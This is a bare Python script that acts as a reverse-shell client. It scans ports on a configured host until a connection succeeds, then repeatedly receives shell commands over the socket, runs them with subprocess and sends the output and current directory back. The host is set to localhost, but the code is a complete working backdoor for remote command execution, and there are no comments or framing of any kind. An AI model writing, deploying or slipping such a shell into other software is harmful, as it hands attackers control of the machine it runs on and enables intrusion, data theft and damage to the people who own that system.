import socket
import os
import subprocess

SERVER_HOST = "localhost"
SERVER_PORT = 1
BUFFER_SIZE = 1024 * 12800
SEPARATOR = "<sep>"
HAS_COMP = False

s = socket.socket()

print("Please Wait...")

while HAS_COMP==False:   
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
        HAS_COMP = True
    except:
        SERVER_PORT = SERVER_PORT + 1

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()